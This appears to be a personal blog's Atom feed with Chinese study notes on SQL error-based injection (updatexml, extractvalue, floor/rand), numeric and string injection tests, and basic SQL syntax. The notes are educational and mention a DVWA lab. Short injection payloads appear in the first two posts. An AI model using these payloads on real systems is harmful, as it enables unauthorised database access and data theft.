<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Jacen&#39;s learing journey</title>
  
  <subtitle>How To Say</subtitle>
  <link href="http://jacen-cpu.github.io/atom.xml" rel="self"/>
  
  <link href="http://jacen-cpu.github.io/"/>
  <updated>2021-07-16T02:47:38.909Z</updated>
  <id>http://jacen-cpu.github.io/</id>
  
  <author>
    <name>Jacen</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>sql报错注入</title>
    <link href="http://jacen-cpu.github.io/2021/07/15/sql%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"/>
    <id>http://jacen-cpu.github.io/2021/07/15/sql%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</id>
    <published>2021-07-15T09:50:13.000Z</published>
    <updated>2021-07-16T02:47:38.909Z</updated>
    
    <content type="html"><![CDATA[<h1 id="xpath报错注入"><a href="#xpath报错注入" class="headerlink" title="xpath报错注入"></a>xpath报错注入</h1><h2 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h2><ul><li>updatexml（）是一个使用不同的xml标记匹配和替换xml块的函数。</li><li>作用：改变文档中符合条件的节点的值</li><li>语法： updatexml（XML_document，XPath_string，new_value） 第一个参数：是string格式，为XML文档对象的名称，文中为Doc 第二个参数：代表路径，Xpath格式的字符串例如//title【@lang】 第三个参数：string格式，替换查找到的符合条件的数据</li><li>updatexml使用时，当xpath_string格式出现错误，mysql则会爆出xpath语法错误（xpath syntax）</li><li>例如： select * from test where ide = 1 and (updatexml(1,0x7e,3)); 由于0x7e是~，不属于xpath语法格式，因此报出xpath语法错误</li></ul><h2 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h2><ul><li>此函数从目标XML中返回包含所查询值的字符串 语法：extractvalue（XML_document，xpath_string） 第一个参数：string格式，为XML文档对象的名称 第二个参数：xpath_string（xpath格式的字符串） select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</li><li>extractvalue使用时当xpath_string格式出现错误，mysql则会爆出xpath语法错误（xpath syntax）</li><li>select user,password from users where user_id=1 and (extractvalue(1,0x7e));</li><li>由于0x7e就是~不属于xpath语法格式，因此报出xpath语法错误。</li></ul><h2 id="报错实战-updatexml-（基于dvwa平台"><a href="#报错实战-updatexml-（基于dvwa平台" class="headerlink" title="报错实战 updatexml() （基于dvwa平台)"></a>报错实战 updatexml() （基于dvwa平台)</h2><h1 id="floor-函数报错注入"><a href="#floor-函数报错注入" class="headerlink" title="floor ()函数报错注入"></a>floor ()函数报错注入</h1><h2 id="floor"><a href="#floor" class="headerlink" title="floor()"></a>floor()</h2><p>floor函数的作用就是返回小于等于括号内该值的最大整数。</p><h2 id="round"><a href="#round" class="headerlink" title="round()"></a>round()</h2><p>rand()可以产生一个在0和1之间的随机数。可以看出，直接使用rand函数每次产生的数值不一样，但当我们提供了一个固定的随机数的种子0之后，每次产生的值都是相同的，这也可以称之为伪随机。</p><h2 id="floor-rand-0-2-函数"><a href="#floor-rand-0-2-函数" class="headerlink" title="floor(rand(0)*2)函数"></a>floor(rand(0)*2)函数</h2><p>floor函数的作用就是返回小于等于括号内该值的最大整数。rand()本身是返回0<del>1的随机数，但在后面*2就变成了返回0</del>2之间的随机数。配合上floor函数就可以产生确定的两个数，即0和1。并且结合固定的随机数种子0，它每次产生的随机数列都是相同的值。此处的myclass 表为含有四行数据的表。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;xpath报错注入&quot;&gt;&lt;a href=&quot;#xpath报错注入&quot; class=&quot;headerlink&quot; title=&quot;xpath报错注入&quot;&gt;&lt;/a&gt;xpath报错注入&lt;/h1&gt;&lt;h2 id=&quot;updatexml&quot;&gt;&lt;a href=&quot;#updatexml&quot; class</summary>
      
    
    
    
    <category term="web" scheme="http://jacen-cpu.github.io/categories/web/"/>
    
    
    <category term="web" scheme="http://jacen-cpu.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入分类</title>
    <link href="http://jacen-cpu.github.io/2021/07/14/SQL%E6%B3%A8%E5%85%A5%E5%88%86%E7%B1%BB/"/>
    <id>http://jacen-cpu.github.io/2021/07/14/SQL%E6%B3%A8%E5%85%A5%E5%88%86%E7%B1%BB/</id>
    <published>2021-07-14T12:34:50.000Z</published>
    <updated>2021-07-14T13:59:22.649Z</updated>
    
    <content type="html"><![CDATA[<h1 id="注入漏洞分类"><a href="#注入漏洞分类" class="headerlink" title="注入漏洞分类"></a>注入漏洞分类</h1><p>常见的SQL注入类型主要包括：数字型和字符型。</p><h2 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h2><p>当输入的参数为整型时，如果存在注入漏洞，则可认为是数字型注入，数字型注入是最简单的一种。</p><p>测试步骤：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HTTP://www.xxser.com/test.php?id=8&#x27;</span><br></pre></td></tr></table></figure><p>出现异常</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HTTP://www.xxser.com/test.php?id=8 and 1=1</span><br></pre></td></tr></table></figure><p>正常执行，结构相同</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HTTP://www.xxser.com/test.php?id=8 and 1=2</span><br></pre></td></tr></table></figure><p>正常执行，结果有差异</p><p>如果以上三个步骤全部满足，则程序可能存在<code>SQL</code>注入</p><h2 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h2><p>当输入参数为字符串时，称为字符型。</p><p>字符型注入的关键是如何闭合<code>SQL</code>语句以及注释多余的代码。</p><p>当查询内容为字符串时：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> usename <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span></span><br></pre></td></tr></table></figure><p>此时要想注入，就要：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> usename <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="comment">-- &#x27;</span></span><br></pre></td></tr></table></figure><p>又比如<code>updata</code>语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updata Person <span class="keyword">set</span> username<span class="operator">=</span><span class="string">&#x27;username&#x27;</span>,<span class="keyword">set</span> password<span class="operator">=</span><span class="string">&#x27;password&#x27;</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p>现在对该<code>SQL</code> 语句进行注入就需要闭合单引号</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updata Person <span class="keyword">set</span> username<span class="operator">=</span><span class="string">&#x27;username&#x27;</span>,<span class="keyword">set</span> password<span class="operator">=</span><span class="string">&#x27;&#x27;</span><span class="operator">+</span>(<span class="keyword">select</span> @<span class="variable">@version</span>)<span class="operator">+</span><span class="string">&#x27;&#x27;</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p>利用两次单引号注释完成了注入。</p><blockquote><p>数据库不同其连接符也不同，SQL Server连接符号为”+”,Oracle连接符为”||”,MySQL连接符为空格、</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;注入漏洞分类&quot;&gt;&lt;a href=&quot;#注入漏洞分类&quot; class=&quot;headerlink&quot; title=&quot;注入漏洞分类&quot;&gt;&lt;/a&gt;注入漏洞分类&lt;/h1&gt;&lt;p&gt;常见的SQL注入类型主要包括：数字型和字符型。&lt;/p&gt;
&lt;h2 id=&quot;数字型注入&quot;&gt;&lt;a href=&quot;#数</summary>
      
    
    
    
    <category term="web" scheme="http://jacen-cpu.github.io/categories/web/"/>
    
    
    <category term="SQL注入" scheme="http://jacen-cpu.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>SQL_language</title>
    <link href="http://jacen-cpu.github.io/2021/07/14/SQL-language/"/>
    <id>http://jacen-cpu.github.io/2021/07/14/SQL-language/</id>
    <published>2021-07-14T02:10:52.000Z</published>
    <updated>2021-07-15T10:27:13.766Z</updated>
    
    <content type="html"><![CDATA[<h1 id="数据库的分类"><a href="#数据库的分类" class="headerlink" title="数据库的分类"></a>数据库的分类</h1><h2 id="关系型"><a href="#关系型" class="headerlink" title="关系型"></a>关系型</h2><p>它可以砍成一个二位矩阵，通过行和列可以确定每一个数据，类似Excel。</p><p>基于关系数据库的数据库软件有很多，目前主流的数据库主要有以下几类：</p><blockquote><ol><li>商用数据库：Oracle，SQL Server，DB2等。</li><li>开源数据库：MySQL，PostgreSQL等。</li><li>桌面数据库：Microsoft Access等。</li><li>嵌入式数据库 ：Sqlite等。</li></ol></blockquote><h2 id="非关系型-NOSQL"><a href="#非关系型-NOSQL" class="headerlink" title="非关系型(NOSQL)"></a>非关系型(NOSQL)</h2><p>​        在非关系数据库中，数据的定义没有关系数据库中的限制，数据的定义可以非常灵活，在如今这个数据爆炸的时代，NoSQL非常适用于那些数据关系不复杂，并且对数据的规模和扩展性有需求的场景。</p><blockquote><p>Mongodb, DynamoDB</p></blockquote><h1 id="SQL-Structured-Query-Language"><a href="#SQL-Structured-Query-Language" class="headerlink" title="SQL(Structured Query Language)"></a>SQL(Structured Query Language)</h1><p>SQL语言定义以下几种操作数据库的功能：</p><blockquote><ul><li>DDL(Data Definition Language)：允许用户定义数据（创建表、删除表、修改表）。</li><li>DML(Data Manipulation Language)：添加、删除、更新数据。</li><li>DQL(Data Query Language)：查询数据，也是最频繁的数据库日常操作。</li></ul></blockquote><h1 id="关系模型"><a href="#关系模型" class="headerlink" title="关系模型"></a>关系模型</h1><p>关系数据库是建立在关系模型上的，而关系模型本质上就是由多个存储数据的二维表组成的。表的每一行叫做记录（ Record），记录是一个逻辑意义上的数据。表的每一列称为字段（Column），同一张表中每一列的数据类型都是一致的。字段包含的数据类型包括整形、浮点型、字符串、日期等等，以及是否允许为空（Null）。</p><p>关系数据库的表和表之间的逻辑关系有三种：“一对多”、“多对一”和“一对一”。</p><h2 id="主键"><a href="#主键" class="headerlink" title="主键"></a>主键</h2><p>关系表中有个很重要的约束，就是任意两条记录不能重复。这里的不能重复指的是每条记录需要一个能和其他记录区别开来的特定字段，这个字段称为<strong>主键</strong>。</p><p>常见的可作为id字段的类型有：</p><blockquote><ol><li>自增整数类型：数据库会在插入数据后自动为每条记录分配一个自增整数，这样我们就不用担心主键重复，也不用自己预先生成主键。</li><li>全局唯一GUID类型：这是一种全局唯一的字符串，类似8f55d96b-8acc-4636-8cb8-76bf8abc2f57。GUID算法通过网卡MAC地址、时间戳和随机数生成在任意时间都不同的字符串，大部分编程语言内置了GUID算法，可以自动生成主键。</li></ol></blockquote><h3 id="联合主键"><a href="#联合主键" class="headerlink" title="联合主键"></a>联合主键</h3><p>关系数据库也允许表通过多个字段来定位记录，既使用两个或多个字段作为主键，这种主键叫做联合主键。对于联合主键，允许一列有重复，但是所有主键的组合必须是唯一的</p><h2 id="外键"><a href="#外键" class="headerlink" title="外键"></a>外键</h2><p>通过另一个表的主键联合两张表的字段就称之为外键。要注意的是，外键必须是另一个表格的主键。</p><h1 id="数据操作"><a href="#数据操作" class="headerlink" title="数据操作"></a>数据操作</h1><h2 id="表格（创建，修改，删除）"><a href="#表格（创建，修改，删除）" class="headerlink" title="表格（创建，修改，删除）"></a>表格（创建，修改，删除）</h2><h3 id="创建表"><a href="#创建表" class="headerlink" title="创建表"></a>创建表</h3><p><code>CREATE TABLE</code>是创建表格的语句。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> table_name (</span><br><span class="line">    column1 datatype1,</span><br><span class="line">    column2 datatype2,</span><br><span class="line">    column3 datatype3,</span><br><span class="line">   ....</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>例如：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Students (</span><br><span class="line">    StudentID <span class="type">int</span>, </span><br><span class="line">    Name <span class="type">varchar</span>(<span class="number">255</span>),</span><br><span class="line">    City <span class="type">varchar</span>(<span class="number">255</span>),</span><br><span class="line">    <span class="keyword">PRIMARY</span> KEY(StudentID)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>特定数据库支持的数据类型不同，以下是常用的<code>SQL</code>数据类型：</p><table><thead><tr><th>数据类型</th><th>描述</th></tr></thead><tbody><tr><td>VARCHAR(n) 或 CHARACTER VARYING(n)</td><td>可变长度的字符/字符串，最大长度为n</td></tr><tr><td>BINARY(n)</td><td>固定长度为n的二进制串</td></tr><tr><td>BOOLEAN</td><td>存储TRUE或FALSE值</td></tr><tr><td>INTEGER(p)</td><td>整数值（没有小数点），精度为p</td></tr><tr><td>INTEGER</td><td>整数值（没有小数点），精度为10</td></tr><tr><td>DECIMAL(p, s)</td><td>精确数值，精度为p，小数点后位数为s。例如：DICIMAL(5,2)小数点前有3位数，小数点后有2位数</td></tr><tr><td>FLOAT(p)</td><td>近似数值，尾数精度为p</td></tr><tr><td>FLOAT</td><td>近似数值，尾数精度为16</td></tr><tr><td>DATE</td><td>存储年、月、日的值</td></tr><tr><td>TIMESTAMP</td><td>存储年、月、日、小时、分、秒的值</td></tr></tbody></table><h3 id="修改表"><a href="#修改表" class="headerlink" title="修改表"></a>修改表</h3><p>如果我们想添加、删除、或者修改表中的特定字段，可以使用ALTER TABLE语句。添加字段语句如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> table_name </span><br><span class="line"><span class="keyword">ADD</span> column_name datatype;</span><br></pre></td></tr></table></figure><p>如果想要删除字段，使用<code>ALTER TABLE table_name DROP COLUMN column_name;</code>语句即可，以下语句就将<code>Students</code>中的<code>Age</code>字段删除了：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Students </span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">COLUMN</span> Age;</span><br></pre></td></tr></table></figure><p>修改字段设定的语句是：<code>ALTER TABLE table_name MODIFY COLUMN column_name data_type</code>; 以下语句将<code>Students</code>中<code>Name</code>的数据类型改为<code>varchar(200)</code>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Students </span><br><span class="line">MODIFY <span class="keyword">COLUMN</span> Name <span class="type">varchar</span>(<span class="number">200</span>);</span><br></pre></td></tr></table></figure><h3 id="删除表"><a href="#删除表" class="headerlink" title="删除表"></a>删除表</h3><p>如果要删除表格，使用<code>DROP TABLE</code>语句即可：<code>DROP TABLE table_name</code>；</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> Students;</span><br></pre></td></tr></table></figure><h2 id="操作记录（增加，删除，修改，替换）"><a href="#操作记录（增加，删除，修改，替换）" class="headerlink" title="操作记录（增加，删除，修改，替换）"></a>操作记录（增加，删除，修改，替换）</h2><p>关系数据库的基本操作是增删差改，既<code>CRUD：Create, Retrieve, Update, Delete</code>。</p><h3 id="插入记录"><a href="#插入记录" class="headerlink" title="插入记录"></a>插入记录</h3><p><code>INSERT INTO</code> 语句用于在表中插入新记录，插入的方法有两张，第一种语法如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> table_name(column1, column2, column3, ...) <span class="keyword">VALUES</span> (value1, value2, value3, ...);</span><br></pre></td></tr></table></figure><p>第二种方法不需要指定<code>column</code>，只需要插入数据，但是要保证数据的顺序和数量和字段是对应的：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> table_name <span class="keyword">VALUES</span> (value1, value2, value3, ...);</span><br></pre></td></tr></table></figure><h3 id="修改记录"><a href="#修改记录" class="headerlink" title="修改记录"></a>修改记录</h3><p><code>UPDATE</code> 语句可以用来修改表中的记录，语法如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">UPDATE table_name</span><br><span class="line"><span class="keyword">SET</span> column1 <span class="operator">=</span> value1, column2 <span class="operator">=</span> value2, ...</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">condition</span>;</span><br></pre></td></tr></table></figure><p>其中WHERE限定了你要更新的记录，关于<code>condtion</code>的内容会在之后学习查询时详细探讨，现在简单理解就好。如果不使用WHERE子句，那么所有的记录都会被更新。以下语句将<code>StudentID</code>为1的学生改名为‘Daniel’：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">UPDATE Students</span><br><span class="line"><span class="keyword">SET</span> Name <span class="operator">=</span> <span class="string">&#x27;Daniel&#x27;</span> </span><br><span class="line"><span class="keyword">WHERE</span> StudentID <span class="operator">=</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure><h3 id="删除记录"><a href="#删除记录" class="headerlink" title="删除记录"></a>删除记录</h3><p>如果要删除已有的记录，我们可以使用<code>DELETE</code>语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> <span class="keyword">table</span> <span class="keyword">WHERE</span> <span class="keyword">condition</span>;</span><br></pre></td></tr></table></figure><h3 id="替换"><a href="#替换" class="headerlink" title="替换"></a>替换</h3><p>替换的意思就是：如果我们希望插入一条新纪录，但是如果此记录已经存在，就先删除原记录，再插入新纪录。此时，我们就能使用<code>REPLACE</code>语句，这样就不需要通过查询，再决定是否先删除再插入了：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REPLACE <span class="keyword">INTO</span> Students(StudentID, name, city) <span class="keyword">VALUES</span> (<span class="number">1</span>, <span class="string">&#x27;Enoch&#x27;</span>, <span class="string">&#x27;New York City&#x27;</span>);</span><br></pre></td></tr></table></figure><p>此语句的作用就是查询id为1的学生记录是否存在，如果不存在，就创建一个新的记录，否则，已有记录会被删除，然后新纪录再被插入。</p><h2 id="约束"><a href="#约束" class="headerlink" title="约束"></a>约束</h2><p><code>SQL</code>约束用于规定表中的数据规则。如果存在违反约束的数据行为，行为会被约束终止。约束可以在创建表时规定（通过<code>CREATE TABLE</code>语句），或者在创建表之后规定（通过<code>ALTER TABLE</code>语句）。</p><h3 id="创建约束-CREATE-TABLE"><a href="#创建约束-CREATE-TABLE" class="headerlink" title="创建约束 CREATE TABLE"></a>创建约束 CREATE TABLE</h3><p>创建表时规定约束的语句如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> table_name (</span><br><span class="line">    column1 data_type1(size) constraint1,</span><br><span class="line">    column2 data_type2(size) constraint2,</span><br><span class="line">    column3 data_type3(size) constraint3,</span><br><span class="line">    ...</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>其中 <code>column</code> 为字段名字，<code>data_type </code>为数据类型，<code>constraint</code> 为约束类型，在<code>SQL</code>中，我们有以下约束：</p><blockquote><ul><li>NOT NULL: 字段不能存储空值。</li><li>UNIQUE: 保证字段的每行都是唯一的值。</li><li>PRIMARY KEY: 主键，NOT NULL和UNIQUE的结合，确保某列（或多列）有唯一标识，用于找到特定记录。</li><li>FOREIGN KEY：保证表中的数据匹配到（指向）另一个表中的主键。</li><li>CHECK: 保证字段的值符合指定条件。</li><li>DEFAULT: 规定没赋值时的默认值。</li></ul></blockquote><h3 id="创建约束-ALTER-TABLE"><a href="#创建约束-ALTER-TABLE" class="headerlink" title="创建约束 ALTER TABLE"></a>创建约束 ALTER TABLE</h3><p>另一种添加约束的方法便是使用<code>ALTER TABLE</code>语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Students </span><br><span class="line">MODIFY Age <span class="type">int</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span>;</span><br></pre></td></tr></table></figure><p>此语句设定了一个新的约束：<code>Students</code>的<code>Age</code>字段不能为空。</p><p>以下语句添加了一个外键约束：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Students</span><br><span class="line"><span class="keyword">ADD</span> <span class="keyword">CONSTRAINT</span> fk_class_id</span><br><span class="line"><span class="keyword">FOREIGN</span> KEY (classID)</span><br><span class="line"><span class="keyword">REFERENCES</span> Classes(id);</span><br></pre></td></tr></table></figure><p>如果要删除<code>Students</code>中<code>classID</code>的外键约束，我们可以使用以下的语句:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Students</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">FOREIGN</span> KEY fk_class_id;</span><br></pre></td></tr></table></figure><h1 id="基本查询语法"><a href="#基本查询语法" class="headerlink" title="基本查询语法"></a>基本查询语法</h1><h2 id="基本查询"><a href="#基本查询" class="headerlink" title="基本查询"></a>基本查询</h2><p>如果想要查询表的数据，我们可以使用<code>SELECT</code>语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> table_name;</span><br></pre></td></tr></table></figure><h2 id="条件查询"><a href="#条件查询" class="headerlink" title="条件查询"></a>条件查询</h2><p>使用<code>SELECT * FROM table_name</code>可以查到一张表的所有记录，但有时我们只需要获取符合特定条件的记录，那么我们就可以添加<code>WHERE</code>语句，来限定查询记录的条件：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> table_name <span class="keyword">WHERE</span> <span class="keyword">condition</span>;</span><br></pre></td></tr></table></figure><h3 id="条件表达式"><a href="#条件表达式" class="headerlink" title="条件表达式"></a>条件表达式</h3><p>条件表达式（condition）有很多种，如果我们需要满足多个条件，可以使用 <code>AND</code> 连接多个条件。如果我们希望同时满足两个条件，那么我们需要在WHERE后面加上<code>condtion1 AND condition2</code>。还有一种条件是 <code>NOT condition</code>，代表不符合某种条件，比如我们要选取 <code>Gender</code> 为 ‘M’ 的学生，另一种写法就是 <code>Gender</code> 不为 ‘F’ 即可。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Students <span class="keyword">WHERE</span> <span class="keyword">NOT</span> Gender <span class="operator">=</span> <span class="string">&#x27;F&#x27;</span>;</span><br></pre></td></tr></table></figure><p>上面 <code>NOT Gender = ‘F’</code> 等价于 <code>Gender &lt;&gt; ‘F’</code>，所以两种写法都可以。如果要组合三个或更多的条件，那么就需要用圆括号<code>()</code>限制条件的判断顺序。比如我们需要查找<code>Age</code>在20以下或22以上，并且是男生的学生，可以使用以下语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Students <span class="keyword">WHERE</span> (Age <span class="operator">&lt;</span> <span class="number">20</span> <span class="keyword">OR</span> Age <span class="operator">&gt;</span> <span class="number">22</span>) <span class="keyword">AND</span> Gender <span class="operator">=</span> <span class="string">&#x27;M&#x27;</span>;</span><br></pre></td></tr></table></figure><p>如果不加括号，条件运算则会按照 NOT, AND, OR 的优先级顺序执行，既NOT优先级最高，最低的是OR。以下是常见条件表达式的总结：</p><table><thead><tr><th>条件</th><th>说明</th><th>Example1</th><th>Example2</th></tr></thead><tbody><tr><td>=</td><td>判断相等</td><td>age = 20</td><td>name = ‘xyz’</td></tr><tr><td>&gt;</td><td>判断大于</td><td>age &gt; 20</td><td>name &gt; ‘xyz’</td></tr><tr><td>&gt;=</td><td>判断大于等于</td><td>age &gt;= 20</td><td>name &gt;= ‘xyz’</td></tr><tr><td>&lt;</td><td>判断小于</td><td>age &lt; 20</td><td>name &lt; ‘xyz’</td></tr><tr><td>&lt;=</td><td>判断小于等于</td><td>age &lt;= 20</td><td>name &lt;= ‘xyz’</td></tr><tr><td>&lt;&gt;</td><td>判断不等于</td><td>age &lt;&gt; 20</td><td>name &lt;&gt; ‘xyz’</td></tr><tr><td>LIKE</td><td>判断相似</td><td></td><td>name LIKE ‘xy%’（%表示任意字符，xy%表示以xy为开头的字符）</td></tr></tbody></table><h2 id="投影查询"><a href="#投影查询" class="headerlink" title="投影查询"></a>投影查询</h2><p>使用<code>SELECT * FROM table_name WHERE condition</code>可以选出表中的若干条记录，所返回的记录字段和原表是相同的，即结果的所有字段与原表的所有字段都一一对应。如果我们只希望返回某些特定字段的数据，而不是所有字段的数据，我们可以用 <code>SELECT column1, column2, … FROM table_name;</code> 让结果集仅包含指定字段。这种操作称为投影查询。</p><p>如果我们只想要不同的数据，可以使用<code>SELECT DISTINCT</code>，语法如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> column1, column2, ... <span class="keyword">FROM</span> table_name;</span><br></pre></td></tr></table></figure><p>如果我们只想知道学生来自哪些不同的城市，可以使用以下语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> City <span class="keyword">FROM</span> Students;</span><br></pre></td></tr></table></figure><h2 id="排序ORDER-BY"><a href="#排序ORDER-BY" class="headerlink" title="排序ORDER BY"></a>排序ORDER BY</h2><p>当我们使用SELECT查询的时候，查询的结果往往是根据主键排序的，在我们的例子中就是按照<code>StudentID</code>排序的。如果我们想要根据我们自定义的字段排序的话，我们可以在最后加上<code>ORDER BY</code>，以下是<code>ORDER BY</code>的语法：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> col1, col2, ... </span><br><span class="line"><span class="keyword">FROM</span> table_name</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> col1, col2, ... <span class="keyword">ASC</span><span class="operator">|</span><span class="keyword">DESC</span>;</span><br></pre></td></tr></table></figure><p>例如，我们希望学生按照年龄从小到大排好序，那么就可以使用以下语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Students <span class="keyword">ORDER</span> <span class="keyword">BY</span> Age;</span><br></pre></td></tr></table></figure><p>如果我们不在<code>ORDE BY</code>最后加上 <code>ASC</code> 或 <code>DESC</code>，那么就是默认从小到大排好序的。其中 <code>ASC</code> 表示从小到大的顺序，<code>DESC</code>表示倒序，以下语句获得的学生则会根据年龄从大到小排好序：w</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Students <span class="keyword">ORDER</span> <span class="keyword">BY</span> Age <span class="keyword">DESC</span>;</span><br></pre></td></tr></table></figure><p>如果我们希望结果按照年纪从小到大排好序后，再根据性别排序的话，可以使用以下语句：</p><figure class="highlight sql"><table><tr><td 